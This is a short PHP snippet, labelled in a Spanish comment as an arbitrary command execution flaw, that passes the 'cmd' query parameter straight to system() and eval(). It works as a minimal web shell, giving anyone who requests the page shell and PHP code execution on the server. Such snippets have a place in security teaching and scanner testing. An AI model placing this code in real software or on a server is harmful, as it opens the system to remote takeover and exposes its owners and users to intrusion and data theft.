<?php
// Ejecución de comandos arbitrarios (Fallo CRÍTICO)
$cmd = $_GET['cmd'];
system($cmd);
eval($cmd);
?>
